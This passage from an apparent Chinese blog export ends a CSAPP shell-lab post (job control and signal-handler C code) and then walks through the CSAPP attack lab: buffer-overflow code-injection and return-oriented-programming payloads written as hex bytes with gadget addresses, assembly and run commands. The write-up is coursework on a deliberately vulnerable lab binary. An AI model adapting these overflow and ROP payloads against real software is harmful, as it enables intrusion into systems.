id);</span><br><span class="line">      <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, id);</span><br><span class="line">         sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>) &#123; <span class="comment">// 读到pid</span></span><br><span class="line">      sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">      job = getjobpid(jobs, id);</span><br><span class="line">      <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, id);</span><br><span class="line">         sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">// 格式错误</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 因为子进程单独成组，所以kill很方便</span></span><br><span class="line">   <span class="comment">// 进程组是负数pid，发送信号并更改状态</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">      kill(-(job-&gt;pid), SIGCONT);</span><br><span class="line">      job-&gt;state = BG;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果fg后台进程，那么将它的状态转为前台进程，然后等待它终止</span></span><br><span class="line">      kill(-(job-&gt;pid), SIGCONT);</span><br><span class="line">      job-&gt;state = FG;</span><br><span class="line">      waitfg(job-&gt;pid);</span><br><span class="line">   &#125;</span><br><span class="line">   sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="void-waitfg-pid-t-pid"><a href="#void-waitfg-pid-t-pid" class="headerlink" title="void waitfg(pid_t pid)"></a>void waitfg(pid_t pid)</h2><p>等待前台命令执行完成。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span> &#123;</span><br><span class="line">   <span class="comment">// 进程回收不需要做，只要等待前台进程就行</span></span><br><span class="line">   <span class="type">sigset_t</span> mask_temp;</span><br><span class="line">   sigemptyset(&amp;mask_temp);</span><br><span class="line">   <span class="comment">// 设定不阻塞任何信号，或者sleep显式等待信号</span></span><br><span class="line">   <span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>)</span><br><span class="line">      sigsuspend(&amp;mask_temp);</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="void-sigchld-handler-int-sig"><a href="#void-sigchld-handler-int-sig" class="headerlink" title="void sigchld_handler(int sig)"></a>void sigchld_handler(int sig)</h2><p>处理<code>SIGCHLD</code>信号，即子进程停止或终止。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">   <span class="type">int</span> olderrno = errno;   <span class="comment">// 保存旧errno</span></span><br><span class="line">   <span class="type">int</span> status;</span><br><span class="line">   <span class="type">pid_t</span> pid;</span><br><span class="line">   <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">   sigfillset(&amp;mask_all);  <span class="comment">// 设置全阻塞</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123; <span class="comment">// WNOHANG | WUNTRACED 是立即返回</span></span><br><span class="line">      sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">      <span class="comment">// 用WIFEXITED(status)，WIFSIGNALED(status)，WIFSTOPPED(status)等来捕获终止或者被停止的子进程的退出状态</span></span><br><span class="line">      <span class="keyword">if</span> (WIFEXITED(status))  <span class="comment">// 正常退出 delete</span></span><br><span class="line">      &#123;</span><br><span class="line">         deletejob(jobs, pid);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;<span class="comment">// 信号退出 delete</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="type">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">         deletejob(jobs, pid);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 停止 只修改状态</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="type">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">         job-&gt;state = ST;</span><br><span class="line">      &#125;</span><br><span class="line">      sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   errno = olderrno;  <span class="comment">// 恢复</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="void-sigint-handler-int-sig"><a href="#void-sigint-handler-int-sig" class="headerlink" title="void sigint_handler(int sig)"></a>void sigint_handler(int sig)</h2><p>处理<code>SIGINT</code>信号，即来自键盘的中断<code>ctrl-c</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">   <span class="comment">// 向子进程发送信号即可</span></span><br><span class="line">   <span class="type">int</span> olderrno = errno;</span><br><span class="line">   <span class="type">pid_t</span> pid;</span><br><span class="line">   <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">   sigfillset(&amp;mask_all);  <span class="comment">// 设置全阻塞</span></span><br><span class="line"></span><br><span class="line">   sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">   pid = fgpid(jobs);</span><br><span class="line">   sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">      kill(-pid, sig);</span><br><span class="line">   errno = olderrno;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="void-sigtstp-handler-int-sig"><a href="#void-sigtstp-handler-int-sig" class="headerlink" title="void sigtstp_handler(int sig)"></a>void sigtstp_handler(int sig)</h2><p>处理<code>SIGTSTP</code>信号，即终端停止信号<code>ctrl-z</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">   <span class="comment">// 向子进程发送信号即可</span></span><br><span class="line">   <span class="type">int</span> olderrno = errno;</span><br><span class="line">   <span class="type">pid_t</span> pid;</span><br><span class="line">   <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">   sigfillset(&amp;mask_all);  <span class="comment">// 设置全阻塞</span></span><br><span class="line"></span><br><span class="line">   sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">   pid = fgpid(jobs);</span><br><span class="line">   sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">      kill(-pid, sig);</span><br><span class="line">   errno = olderrno;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="部分测试结果"><a href="#部分测试结果" class="headerlink" title="部分测试结果"></a>部分测试结果</h2><img src="https://img.lfalive.top/CSAPP-shlab/1.png" style="zoom: 50%;" /><img src="https://img.lfalive.top/CSAPP-shlab/2.png" style="zoom: 50%;" /><img src="https://img.lfalive.top/CSAPP-shlab/3.png" style="zoom: 50%;" /><img src="https://img.lfalive.top/CSAPP-shlab/4.png" style="zoom: 50%;" /><img src="https://img.lfalive.top/CSAPP-shlab/5.png" style="zoom: 50%;" />]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP实验——attack lab</title>
      <link href="/2021/12/05/CSAPP-target1/"/>
      <url>/2021/12/05/CSAPP-target1/</url>
      
        <content type="html"><![CDATA[<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_41256413/article/details/80463280">深入理解计算机系统attack lab</a></p><p><a href="https://www.jianshu.com/p/db731ca57342/">CSAPP:Attack lab</a></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>push：将数据压入栈中，具体操作是rsp先减，然后将数据压入sp所指的内存地址中。rsp寄存器总是指向栈顶，但不是空单元。</p><p>pop：将数据从栈中弹出，然后rsp加操作，确保rsp寄存器指向栈顶，不是空单元。</p><h2 id="HEX2RAW"><a href="#HEX2RAW" class="headerlink" title="HEX2RAW"></a>HEX2RAW</h2><p>HEX2RAW期望由一个或多个空格分隔的两位十六进制值。</p><p>所以如果你想创建一个十六进制值为0的字节，需要将其写为00。</p><p>要创建单词0xdeadbeef应将“ ef be ad de”传递给HEX2RAW（请注意，小字节序需要反转）。</p><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><img src="https://img.lfalive.top/CSAPP-target1/1.png" style="zoom:50%;" /><p>要求进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)。</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="meta"># touch1</span></span><br></pre></td></tr></table></figure><p>buff-size为40字节，将其填满后注入touch1的开始地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; attack1.txt &gt; attackraw1.txt</span><br><span class="line">./ctarget -qi attackraw1.txt</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>Level2和Level1差别主要在Level2多了一个val参数，我们在跳转到Level2时，还要将其参数传递过去，让他认为是自己的cookie <strong>0x59b997fa</strong>。</p><p>将以下代码注入缓冲区。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span>    $<span class="number">0x59b997fa</span>,%rdi</span><br><span class="line">pushq  $<span class="number">0x4017ec</span>              <span class="meta"># 压栈，ret时会将0x4017ec弹出执行</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>使用以下命令编译和反编译。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c attack2.s</span><br><span class="line">objdump -d attack2.o &gt; attack2.d</span><br></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="meta"># 以上包含注入代码填充满整个缓冲区（40字节）以致溢出。</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="meta"># 用缓冲区的起始地址覆盖掉原先的返回地址（注意字节顺序）。</span></span><br></pre></td></tr></table></figure><p>缓冲区地址为0x5561dca0(栈底)，因为分配了一个0x28的栈,插入的代码在字符串首，即栈顶（低地址），所以地址最终要取<strong>0x5561dca0-0x28 &#x3D; 0x5561dc78</strong>。</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>s的位置是随机的，所以之前留在getbuf中的数据，则有可能被hexmatch所重写，为了安全起见，我们把字符串放在getbuf的父栈帧中，也就是test栈帧中。</p><p>将字符串的地址传送到%rdi中，hexmatch函数需要的是cookie的字符串表示。因此，我们要将%rdi设置为cookie的地址即字符串表示。</p><p><strong>0x59b997fa -&gt; 35 39 62 39 39 37 66 61</strong></p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span>    $<span class="number">0x5561dca8</span>,%rdi</span><br><span class="line">pushq  $<span class="number">0x4018fa</span></span><br><span class="line">retq</span><br></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span>    <span class="meta"># 注入代码</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="meta"># 用缓冲区的起始地址覆盖掉原先的返回地址（注意字节顺序）。</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="meta"># 地址0x5561dca0</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>    <span class="meta"># cookie的字符串表示，地址0x5561dca8</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">19</span> <span class="number">2</span>b <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># pop %rdi</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># cookie</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># touch2</span></span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>将%rsp和偏移量<strong>分别存入</strong>%rdi和%rsi，再使用lea指令。通过**%eax-&gt;%edx-&gt;%ecx-&gt;%esi**来完成。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 缓冲区</span></span><br><span class="line">ad <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># movq %rsp, %rax</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># movq %rax, %rdi</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># popq %rax</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 偏移值</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># mov %eax, %edx</span></span><br><span class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># mov %edx, %ecx</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># mov %ecx, %esi</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># lea (%rsi, %rdi, 1) %rax #add操作</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># movq %rax, %rdi</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># touch3</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>   <span class="meta"># cookie</span></span><br></pre></td></tr></table></figure><p>执行movq %rsp, %rax的时候，%rsp先指向movq %rax, %rdi所在地址，然后再进入子函数执行指令。cookie和这个时候记录下来的%rsp地址的偏移就是48。某次调试记录的栈地址如下：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 省略getbuf缓冲区</span></span><br><span class="line">ad <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa018 # movq %rsp, %rax</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa020 # movq %rax, %rdi</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa028</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa050</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa058</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="meta"># 0x7ffffffaa060</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span>  <span class="meta"># 0x7ffffffaa068 # cookie</span></span><br></pre></td></tr></table></figure><p>说明movq %rsp,%rax指令存的是%rsp新值。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>直接加偏移值</strong>，address is ox4019d8,execute a part of add_xy。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="number">0x37</span>,%al</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 缓冲区</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># movq %rsp,%rax</span></span><br><span class="line">d8 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># add 0x37,%al</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># movq %rax,%rdi</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># touch3</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">35</span>   <span class="meta"># %rsp+37 cookie</span></span><br><span class="line"><span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>某次调试显示的栈地址：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 省略getbuf缓存区</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd538 # movq %rsp,%rax</span></span><br><span class="line">d8 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd540</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd548</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd550</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd558</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd560</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span 